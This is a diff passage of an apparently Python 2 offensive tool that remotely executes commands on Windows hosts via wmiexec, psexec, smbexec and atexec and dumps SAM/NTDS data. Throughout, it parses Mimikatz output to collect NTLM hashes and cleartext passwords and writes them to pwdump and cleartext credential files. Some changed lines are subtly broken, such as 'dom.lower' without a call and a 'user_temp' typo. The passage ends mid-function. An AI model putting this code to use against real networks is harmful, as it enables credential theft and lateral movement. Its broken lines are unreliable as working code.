@@ -3582,6 +3582,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 else:
                     print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
                 return # changed from continue inside a function
+    return(creds_dict)
 
 def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict): 
     if scan_type:
@@ -3632,6 +3633,7 @@ def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntd
         else:
             print("[-] Could not execute the command against %s using the domain %s user %s and password %s at: %s") % (dst, dom, usr, pwd, st)
         return
+    return(creds_dict)
 
 def instructions_func(payload, src_port, command, unprotected_command, smbexec_cmd, execution, delivery):
     if "web" in delivery and "invoker" or "executor" in execution:
@@ -3863,8 +3865,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
     cached_temp = None
     if pwd and ":" in pwd and pwd.count(':') != 6:
         SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(pwd_temp, verbose, usr_temp)
-        dom_temp = dom
-        temp_key = "%s\%s" % (dom_temp, usr_temp)
+        dom_temp = dom.lower()
+        usr_temp = usr_temp.lower()
+        temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
             sys.exit("[!] Credential %s does not have a username") % (hash_temp)
         if temp_key in creds_dict:
@@ -3874,8 +3877,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
     elif pwd and ":" in pwd and pwd.count(':') == 6:
         usr_temp = usr
         SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(pwd_temp, verbose, usr_temp)
-        dom_temp = dom
-        temp_key = "%s\%s" % (dom_temp, usr_temp)
+        dom_temp = dom.lower
+        usr_temp = usr_temp.lower
+        temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
             sys.exit("[!] Credential %s does not have a username") % (hash_temp)
         if temp_key in creds_dict:
@@ -3884,8 +3888,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
     elif pwd and ":" in pwd and pwd.count(':') == 1:
         SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(pwd_temp, verbose, usr_temp)
-        dom_temp = dom
-        temp_key = "%s\%s" % (dom_temp, usr_temp)
+        dom_temp = dom.lower()
+        usr_temp = usr_temp.lower()
+        temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
             sys.exit("[!] Credential %s does not have a username") % (hash_temp)
         if temp_key in creds_dict:
@@ -3893,8 +3898,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
         else:
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
     elif usr and pwd and pwd not in ":":
-        dom_temp = dom
-        temp_key = "%s\%s" % (dom_temp, usr_temp)
+        dom_temp = dom.lower()
+        usr_temp = usr_temp.lower()
+        temp_key = "%s\\%s" % (dom_temp, usr_temp)
         if not usr_temp:
             sys.exit("[!] Credential %s does not have a username") % (hash_temp)
         if temp_key in creds_dict:
@@ -3908,7 +3914,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
             if "WORKGROUP" not in dom or dom_temp == None:
                 dom_temp = dom
             SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
-            temp_key = "%s\%s" % (dom_temp, usr_temp)
+            dom_temp = dom_temp.lower()
+            usr_temp = usr_temp.lower()
+            temp_key = "%s\\%s" % (dom_temp, usr_temp)
             if not usr_temp:
                 sys.exit("[!] Credential %s does not have a username") % (hash_temp)
             if temp_key in creds_dict:
@@ -3920,7 +3928,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
 	    hash_temp = cred
 	    dom_temp = dom
 	    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
-	    temp_key = "%s\%s" % (dom_temp, usr_temp)
+            dom_temp = dom_temp.lower()
+            usr_temp = usr_temp.lower()
+	    temp_key = "%s\\%s" % (dom_temp, usr_temp)
             if not usr_temp:
                 sys.exit("[!] Credential %s does not have a username") % (hash_temp)
             if temp_key in creds_dict:
@@ -3933,8 +3943,10 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
 	    usr_temp, hash_temp, dom_temp = cred.split(' ')
 	    if "WORKGROUP" not in dom or dom_temp == None:
 	        dom_temp = dom
+            dom_temp = dom_temp.lower()
+            usr_temp = usr_temp.lower()
 	    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp)
-	    temp_key = "%s\%s" % (dom_temp, usr_temp)
+	    temp_key = "%s\\%s" % (dom_temp, usr_temp)
 	    if not usr_temp:
                 sys.exit("[!] Credential %s does not have a username") % (hash_temp)
             if temp_key in creds_dict:
@@ -3947,7 +3959,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
 		dom_temp, cred_temp = cred.split('\\')
 		usr_temp, hash_temp = cred_temp.split(' ')
 	        SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp)
-		temp_key = "%s\%s" % (dom_temp, usr_temp)
+                dom_temp = dom_temp.lower()
+                usr_temp = usr_temp.lower()
+		temp_key = "%s\\%s" % (dom_temp, usr_temp)
                 if "WORKGROUP" not in dom or dom_temp == None:
                     dom_temp = dom
 	        if not usr_temp:
@@ -3962,7 +3976,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
 		SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp)
                 if "WORKGROUP" not in dom or dom_temp == None:
                     dom_temp = dom
-                temp_key = "%s\%s" % (dom_temp, usr_temp)
+                dom_temp = dom_temp.lower()
+                usr_temp = usr_temp.lower()
+                temp_key = "%s\\%s" % (dom_temp, usr_temp)
 		if not usr_temp:
                     sys.exit("[!] Credential %s does not have a username") % (hash_temp)
                 if temp_key in creds_dict:
@@ -3977,6 +3993,8 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
 	    usr_temp, pwd_temp, dom_temp = cred.split(' ')
 	    if "WORKGROUP" not in dom or dom_temp == None:
 	        dom_temp = dom
+            dom_temp = dom_temp.lower()
+            usr_temp = usr_temp.lower()
 	    temp_key = "%s\%s" % (dom_temp, usr_temp)
 	    if not usr_temp:
                 sys.exit("[!] Credential %s does not have a username") % (hash_temp)
@@ -3991,7 +4009,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
      	        if "WORKGROUP" not in dom or dom_temp == None:
 	            dom_temp = dom
                 usr_temp, pwd_temp = cred_temp.split(' ')
-	        temp_key = "%s\%s" % (dom_temp, usr_temp)
+                dom_temp = dom_temp.lower()
+                usr_temp = usr_temp.lower()
+	        temp_key = "%s\\%s" % (dom_temp, usr_temp)
 	        if not usr_temp:
                     sys.exit("[!] Credential %s does not have a username") % (hash_temp)
                 if temp_key in creds_dict:
@@ -4001,8 +4021,9 @@ def add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = N
             else:
 	        cred.rstrip()
                 usr_temp, pwd_temp = cred.split(' ')
-	        dom_temp = dom
-                temp_key = "%s\%s" % (dom_temp, usr_temp)
+	        dom_temp = dom.lower()
+                user_temp = usr_temp.lower()
+                temp_key = "%s\\%s" % (dom_temp, usr_temp)
 	        if not usr_temp:
                     sys.exit("[!] Credential %s does not have a username") % (hash_temp)
                 if temp_key in creds_dict:
@@ -4032,28 +4053,38 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, 
     logged_in_file = "/opt/ranger/results/logged_in_users/"
     results_file = "/opt/ranger/results/"
     message = ""
+    notice = ""
+    message_list = []
     cleanup = (colorama.Style.RESET_ALL)
     success = (colorama.Fore.GREEN)
     failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
     for k, v in output_cat.iteritems():
         if "invoker" in k:
             if verbose > 2:
                 logger_obj.info(data)
             if "gentilkiwi" in data:
                 creds_dict = access_to_method(verbose, creds_dict, dom, data, usr, pwd, dst)
-                #message, creds_dict = logged_in_users_method(verbose, creds_dict, dom, data)
                 notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
                 logger_obj.info(notice)
                 notice = ""
-                creds_dict, message = invoker_parser(creds_dict, data, dom, pwd, usr)
+                creds_dict, message_list = invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom, pwd, usr)
+                for message in message_list:
+                    if "[++]" in message:
+                        notice = (epic + message)
+                        logger_obj.info(notice)
+                        notice = ""
+                    if "[+]" in message:
+                        notice = (success + message)
+                        logger_obj.info(notice)
+                        notice = ""
+                    if "[-]" in message:
+                        notice = (failure + message)
+                        logger_obj.info(notice)
+                        notice = ""
             else:
                 notice = (failure + "Failed to access system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
                 logger_obj.info(notice)
-                notice = ""
-            if "*" in message:
-                notice = (success + message)
-                if verbose > 0:
-                    logger_obj.info(notice)
                 notice = ""
             print(cleanup)
             filename = "logged_in_users" + "_" + dst
@@ -4118,7 +4149,7 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, 
             #    logger_obj.info(data)
             if "\\" in data:
                 creds_dict = access_to_method(verbose, creds_dict, dom, data, usr, pwd, dst)
-                message, creds_dict = logged_in_users_method(verbose, creds_dict, dom, data)
+                message, creds_dict = logged_in_users_method(verbose, creds_dict, dom, dst, data, usr)
                 notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
                 logger_obj.info(notice)
                 notice = ""
@@ -4164,7 +4195,7 @@ def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, s
     if psexec_cmd:
         psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict)
     elif wmiexec_cmd:
-        wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st, creds_dict)
+        creds_dict = wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st, creds_dict)
     elif netview_cmd:
         netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict)
     elif smbexec_cmd:
@@ -4172,9 +4203,10 @@ def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, s
     elif atexec_cmd:
         atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value, logger_obj, output_cat, st, creds_dict)
     elif sam_dump:
-        sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict)
+        creds_dict = sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict)
     else:
-        print(instructions)   
+        print(instructions)
+    return(creds_dict) 
 
 def matrix_read(creds_matrix):
     with open(creds_matrix, 'r') as f:
@@ -4182,7 +4214,7 @@ def matrix_read(creds_matrix):
         creds_dict = ast.literal_eval(s)
     return(creds_dict)
     
-def matrix_write(creds_dict, recovery):
+def matrix_write(creds_dict, recovery, logger_obj):
     st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     if recovery:
         creds_matrix = "/opt/ranger/results/recovery/recovery_matrix"
@@ -4192,7 +4224,7 @@ def matrix_write(creds_dict, recovery):
         f.write(str(creds_dict))
     return(creds_matrix)
 
-def targets_write(final_targets, recovery):
+def targets_write(final_targets, recovery, logger_obj):
     if recovery:
         updated_targets = "/opt/ranger/results/recovery/recovery_targets"
     else:
@@ -4210,31 +4242,36 @@ def targets_curtail(dst, final_targets):
     final_targets = final_targets[tgt_index:]
     return(final_targets)
 
-def cleartext_writer(creds_dict, recovery):
+def cleartext_writer(creds_dict, recovery, logger_obj):
     st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     cred_list = []
     if recovery:
         cred_file = "/opt/ranger/results/recovery/recovery_cleartext"
     else:
         cred_file = "/opt/ranger/results/credentials/cleartext_" + st
-    for k, v in creds_dict.iteritems():
-        if v[5]:
-            set = k + " " + v[5]
-            cred_list.append(set)
-    with open(cred_file, 'w') as f:
-        for cred in cred_list:
-            f.write(cred + '\n')
+    try:
+        for k, v in creds_dict.iteritems():
+            if v[5]:
+                set = k + " " + v[5]
+                cred_list.append(set)
+        with open(cred_file, 'w') as f:
+            for cred in cred_list:
+                f.write(cred + '\n')
+    except Exception as e:
+        notice = "An error occurred: %s" % (e)
+        logger_obj.info(notice)
     return(cred_file)
 
-def invoker_parser(creds_dict, data, dom = None, pwd = None, usr = None):
+def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd = None, usr = None):
+    data_null = None
     temp_list = []
     SID_temp = None
-    LM_temp = "aad3b435b51404eeaad3b435b51404ee"
+    LM_temp = None
     NTLM_temp = None
     hash_temp = None
-    usr_temp = usr
-    pwd_temp = pwd
-    dom_temp = dom
+    usr_temp = None
+    pwd_temp = None
+    dom_temp = None
     local_admin_temp = []
     groups_temp = {}
     cached_temp = None
@@ -4267,80 +4304,72 @@ def invoker_parser(creds_dict, data, dom = None, pwd = None, usr = None):
     for item in msv_indices:
         item_range = item + 5
         temp_list = parse_list[item:item_range]
-        if "wdigest" in temp_list:
-            temp_list = []
-            continue
         msv_results[mi] = temp_list
         item_range = None
         mi += 1
     for k, v in wdigest_results.iteritems():
-        print(wdigest_results) #DEBUG
         if "kerberos" in v or not v:
             continue
         else:
-            for item in v:
-                if not item:
-                    continue
-                if "Domain" or "Username" or "Password" in item:
-                    if "Domain" in item:
-                        print(item) #DEBUG
-                        print("here") #DEBUG
-                        idicator1, raw_domain = item.split(':')
-                    elif "Username" in item:
-                        print(item) #DEBUG
-                        print("here1") #DEBUG
-                        indicator2, raw_username = item.split(':')
-                    elif "Password" in item:
-                        print(item) #DEBUG
-                        print("here2") #DEBUG
-                        indicator3, raw_password = item.split(':')
+            try:
+                for item in v:
+                    if not item:
+                        continue
+                    if "Domain" or "Username" or "Password" in item:
+                        if "Domain" in item:
+                            idicator1, raw_domain = item.split(':')
+                        elif "Username" in item:
+                            indicator2, raw_username = item.split(':')
+                        elif "Password" in item:
+                            indicator3, raw_password = item.split(':')
+                        else:
+                            continue
                     else:
                         continue
+                if not (raw_domain or raw_username or raw_password) or "null" in (raw_domain or raw_username or raw_password):
+                    raw_username = None
+                    raw_domain = None
+                    raw_password = None
+                    continue
+                if raw_domain and "null" not in raw_domain:
+                    raw_domain = raw_domain.strip()
                 else:
-                    continue
-            if raw_domain and "null" not in raw_domain:
-                raw_domain = raw_domain.strip()
-            else:
-                raw_domain = None
-            if raw_username and "null" not in raw_username:
-                raw_username = raw_username.strip()
-            else:
-                raw_username = None
-            if raw_password and "null" not in raw_password:
-                raw_password = raw_password.strip()
-            else:
-                raw_password = None
-            if "null" in raw_domain and raw_username:
-                continue
-            if raw_domain and raw_username:
-                keyed = raw_domain + "\\" + raw_username
-            else:
-                continue
-            wdigest_dict[keyed] = [raw_domain, raw_username, raw_password]
-            print(wdigest_dict) #DEBUG
+                    raw_domain = None
+                if raw_username and "null" not in raw_username:
+                    raw_username = raw_username.strip()
+                else:
+                    raw_username = None
+                if raw_password and "null" not in raw_password:
+                    raw_password = raw_password.strip()
+                else:
+                    raw_password = None
+                if (raw_domain and raw_username) and "null" not in (raw_domain and raw_username):
+                    keyed = raw_domain + "\\" + raw_username
+                    wdigest_dict[keyed] = [raw_domain, raw_username, raw_password]
+                else:
+                    continue               
+            except Exception as e:
+                notice = "An error occurred: %s" % (e)
+                #logger_obj.info(notice)            
     for k, v in msv_results.iteritems():
-        if "wdigest" or "kerberos" or "credman" or "ssp" or "tspkg" in v or not v:
-            print("HIT") #DEBUG
-            continue
-        else:
+        try:
             for item in v:
-                if not item:
-                    continue
                 if "Domain" or "Username" or "NTLM" in item:
                     if "Domain" in item:
-                        print(item) #DEBUG
-                        print("here4") #DEBUG
                         idicator1, raw_domain = item.split(':')
                     elif "Username" in item:
-                        print("here5") #DEBUG
                         indicator2, raw_username = item.split(':')
                     elif "NTLM" in item:
-                        print("here6") #DEBUG
                         indicator3, raw_NTLM = item.split(':')
                     else:
                         continue
                 else:
                     continue
+            if not (raw_domain or raw_username or raw_NTLM) or "null" in (raw_domain or raw_username or raw_NTLM):
+                raw_domain = None
+                raw_username = None
+                raw_NTLM = None
+                continue
             if raw_domain and "null" not in raw_domain:
                 raw_domain = raw_domain.strip()
             else:
@@ -4353,182 +4382,210 @@ def invoker_parser(creds_dict, data, dom = None, pwd = None, usr = None):
                 raw_NTLM = raw_NTLM.strip()
             else:
                 raw_NTLM = None
-            if "null" in raw_domain and raw_username:
-                continue
-            if raw_domain and raw_username:
+            if (raw_domain and raw_username) and "null" not in (raw_domain and raw_username):
                 keyed = raw_domain + "\\" + raw_username
+                msv_dict[keyed] = [raw_domain, raw_username, raw_NTLM]
             else:
                 continue
-            msv_dict[keyed] = [raw_domain, raw_username, raw_NTLM]
-            print(msv_dict) #DEBUG
+        except Exception as e:
+            notice = "An error occurred: %s" % (e)
+            #logger_obj.info(notice)
     for k, v in msv_dict.iteritems():
-        dom_temp = v[0]
-        usr_temp = v[1]
+        dom_temp = v[0].lower()
+        usr_temp = v[1].lower()
         NTLM_temp = v[2]
-        print(dom_temp, usr_temp, NTLM_temp) #DEBUG
-        temp_key = dom_temp + "\\" + usr_temp
+        if dom_temp and usr_temp:
+            temp_key = dom_temp + "\\" + usr_temp
+            message, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
+            message_list.append(message)
+            if not NTLM_temp:
+                message = "[-] %s\\%s NTLM hash was nullified in memory" % (dom_temp, usr_temp)
+                message_list.append(message)
+            else:
+                message = "[++] %s\\%s NTLM hash is %s" % (dom_temp, usr_temp, NTLM_temp)
+                message_list.append(message)
+        else:
+            continue
         if temp_key in creds_dict:
             creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-            if not creds_dict[temp_key][4] and LM_temp:
-                creds_dict[temp_key][4] = LM_temp
-            if not creds_dict[temp_key][5] and NTLM_temp:
-                creds_dict[temp_key][5] = NTLM_temp
-            if not creds_dict[temp_key][6] and LM_temp and NTLM_temp:
-                creds_dict[temp_key][6] = LM_temp + ":" + NTLM_temp
-            if not creds_dict[temp_key][7] and usr_temp:
-                creds_dict[temp_key][7] = usr_temp
-            if not creds_dict[temp_key][9] and dom_temp:
-                creds_dict[temp_key][9] = dom_temp
+            if not creds_dict[temp_key][1] and NTLM_temp:
+                creds_dict[temp_key][1] = "aad3b435b51404eeaad3b435b51404ee"
+            if not creds_dict[temp_key][2] and NTLM_temp:
+                creds_dict[temp_key][2] = NTLM_temp
+            if not creds_dict[temp_key][3] and not creds_dict[temp_key][1] and NTLM_temp:
+                creds_dict[temp_key][3] = "aad3b435b51404eeaad3b435b51404ee:" + NTLM_temp
+            if not creds_dict[temp_key][4] and usr_temp:
+                creds_dict[temp_key][4] = usr_temp
+            if not creds_dict[temp_key][6] and dom_temp:
+                creds_dict[temp_key][6] = dom_temp
         else:
-            if LM_temp:
-                creds_dict[temp_key][4] = LM_temp
-            if NTLM_temp:
-                creds_dict[temp_key][5] = NTLM_temp
-            if LM_temp and NTLM_temp:
-                creds_dict[temp_key][6] = LM_temp + ":" + NTLM_temp
-            if usr_temp:
-                creds_dict[temp_key][7] = usr_temp
-            if dom_temp:
-                creds_dict[temp_key][9] = dom_demp
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
     for k, v in wdigest_dict.iteritems():
-        dom_temp = v[0]
-        usr_temp = v[1]
+        dom_temp = v[0].lower()
+        usr_temp = v[1].lower()
         pwd_temp = v[2]
-        temp_key = dom_temp + "\\" + usr_temp
-        print(dom_temp, usr_temp, pwd_temp) #DEBUG
+        if dom_temp and usr_temp:
+            temp_key = dom_temp + "\\" + usr_temp
+            message, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
+            message_list.append(message)        
+            if not pwd_temp:
+                message = "[-] %s\\%s password was nullified in memory" % (dom_temp, usr_temp)
+                message_list.append(message)
+            else:
+                message = "[++] %s\\%s password is %s" % (dom_temp, usr_temp, pwd_temp)
+                message_list.append(message)
+        else:
+            continue
         if temp_key in creds_dict:
             creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-            if not creds_dict[temp_key][7] and usr_temp:
-                creds_dict[temp_key][7] = usr_temp
-            if not creds_dict[temp_key][8] and pwd_temp:
-                creds_dict[temp_key][8] = pwd_temp
-            if not creds_dict[temp_key][9] and dom_temp:
-                creds_dict[temp_key][9] = dom_temp
+            if not creds_dict[temp_key][4] and usr_temp:
+                creds_dict[temp_key][4] = usr_temp
+            if not creds_dict[temp_key][5] and pwd_temp:
+                creds_dict[temp_key][5] = pwd_temp
+            if not creds_dict[temp_key][6] and dom_temp:
+                creds_dict[temp_key][6] = dom_temp
         else:
-            if usr_temp:
-                creds_dict[temp_key][7] = usr_temp
-            if pwd_temp:
-                creds_dict[temp_key][8] = pwd_temp
-            if dom_temp:
-                creds_dict[temp_key][9] = dom_demp
+            print(temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)#DEBUG
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-    print(creds_dict)
-    return(creds_dict, message)
+    print(creds_dict) #DEBUG
+    return(creds_dict, message_list)
 
+#temp_list = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, access_to_temp, cached_temp]
 #creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp=[], groups_temp={}, logged_in_temp=[]}
 
-def pwdump_writer(creds_dict, recovery):
+def pwdump_writer(creds_dict, recovery, logger_obj):
     st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     hash_list = []
     if recovery:
         pwdump = "/opt/ranger/results/recovery/recovery_pwdump"
     else:
         pwdump = "/opt/ranger/results/credentials/pwdump_" + st
-    for k, v in creds_dict.iteritems():
-        if v[0] and v[1] and v[2]:
-            set = v[4] + ":" + v[0] + ":" + v[1] + ":" + v[2] + ":::"
-            hash_list.append(set)
-    with open(pwdump, 'w') as f:
-        for hash in hash_list:
-            f.write(hash + '\n')
+    try:
+        for k, v in creds_dict.iteritems():
+            if v[0] and v[1] and v[2]:
+                set = v[4] + ":" + v[0] + ":" + v[1] + ":" + v[2] + ":::"
+                hash_list.append(set)
+        with open(pwdump, 'w') as f:
+            for hash in hash_list:
+                f.write(hash + '\n')
+    except Exception as e:
+        notice = "An error occurred: %s" % (e)
+        logger_obj.info(notice)
     return(pwdump)
 
-def access_to_writer(creds_dict, recovery):
+def access_to_writer(creds_dict, recovery, logger_obj):
     map_list = []
     st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     if recovery:
         access_to = "/opt/ranger/results/recovery/recovery_access_to"
     else:
         access_to = "/opt/ranger/results/credentials/access_to" + st
-    for k, v in creds_dict.iteritems():
-        if v[10]:
-            accesses = ','.join(map(str, v[10]))
-            set = k + ":" + accesses
-            map_list.append(set)
-    with open(access_to, 'w') as f:
-        for mapping in map_list:
-            f.write(mapping + '\n')
+    try:
+        for k, v in creds_dict.iteritems():
+            if v[10]:
+                accesses = ','.join(map(str, v[10]))
+                set = k + ":" + accesses
+                map_list.append(set)
+        with open(access_to, 'w') as f:
+            for mapping in map_list:
+                f.write(mapping + '\n')
+    except Exception as e:
+        notice = "An error occurred: %s" % (e)
+        logger_obj.info(notice)
     return(access_to)
 
-def logged_in_writer(creds_dict, recovery):
+def logged_in_writer(creds_dict, recovery, logger_obj):
     map_list = []
     st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     if recovery:
         access_to = "/opt/ranger/results/recovery/recovery_logged_in_to"
     else:
         access_to = "/opt/ranger/results/credentials/logged_in_to_" + st
-    for k, v in creds_dict.iteritems():
-        if v[9]:
-            locations = ','.join(map(str, v[9]))
-            set = k + ":" + locations
-            map_list.append(set)
-    with open(access_to, 'w') as f:
-        for mapping in map_list:
-            f.write(mapping + '\n')
+    try:
+        for k, v in creds_dict.iteritems():
+            if v[9]:
+                locations = ','.join(map(str, v[9]))
+                set = k + ":" + locations
+                map_list.append(set)
+        with open(access_to, 'w') as f:
+            for mapping in map_list:
+                f.write(mapping + '\n')
+    except Exception as e:
+        notice = "An error occurred: %s" % (e)
+        logger_obj.info(notice)
     return(access_to)
 
-def data_writer(creds_dict, dst, final_targets, recovery):
-    fn = matrix_write(creds_dict, recovery)
+def data_writer(creds_dict, dst, final_targets, recovery, logger_obj):
+    fn = matrix_write(creds_dict, recovery, logger_obj)
     print("[+] Wrote the saved credential matrix to: %s") % (fn)
     updated_targets = targets_curtail(dst, final_targets)
-    fn = targets_write(updated_targets, recovery)
+    fn = targets_write(updated_targets, recovery, logger_obj)
     print("[+] Wrote the remaining targets to the following file: %s") % (fn)
-    fn = cleartext_writer(creds_dict, recovery)
+    fn = cleartext_writer(creds_dict, recovery, logger_obj)
     print("[+] Wrote the cleartext credentials to the following file: %s") % (fn)
-    fn = pwdump_writer(creds_dict, recovery)
+    fn = pwdump_writer(creds_dict, recovery, logger_obj)
     print("[+] Wrote the pwdump credentials to the following file: %s") % (fn)
-    fn = access_to_writer(creds_dict, recovery)
+    fn = access_to_writer(creds_dict, recovery, logger_obj)
     print("[+] Wrote the IP to account access mapping to the following file: %s") % (fn)
-    fn = logged_in_writer(creds_dict, recovery)
+    fn = logged_in_writer(creds_dict, recovery, logger_obj)
     print("[+] Wrote the current user's session locations to the following file: %s") % (fn)
 
-def logged_in_users_method(verbose, creds_dict, dom, data):
+def logged_in_users_method(verbose, creds_dict, dom, dst, data = None, usr = None):
     temp_list = []
     SID_temp = None
     LM_temp = None
     NTLM_temp = None
     hash_temp = None
-    usr_temp = None
+    usr_temp = usr
     pwd_temp = None
     dom_temp = None
+    logged_in_temp = []
+    access_to_temp = []
     local_admin_temp = []
     groups_temp = {}
     cached_temp = None
     message = ""
-    for line in data.splitlines():
-        mutate = []
-        logged_in_temp = []
-        access_to_temp = []
-        mutate = line.split()
-        ip = mutate[0]
-        ip = ip.strip(':')
-        temp_key = mutate[2]
-        dom_temp, usr_temp = temp_key.split("\\")
-        if not (dom_temp is dom):
-            dom_temp = "WORKGROUP"
-        temp_key = dom_temp + "\\" + usr_temp
-        if temp_key in creds_dict:
-            creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-            logged_in_temp = creds_dict[temp_key][9]
-            access_to_temp = creds_dict[temp_key][10]
-            logged_in_temp.append(ip)
-            set = sets.Set(logged_in_temp)
-            logged_in_temp = list(set)
-            access_to_temp.append(ip)
-            set = sets.Set(access_to_temp)
-            access_to_temp = list(set)
-            creds_dict[temp_key][9] = logged_in_temp
-            creds_dict[temp_key][10] = access_to_temp
-        else:
-            logged_in_temp.append(ip)
-            set = sets.Set(logged_in_temp)
-            logged_in_temp = list(set)
-            access_to_temp.append(ip)
-            set = sets.Set(access_to_temp)
-            access_to_temp = list(set)
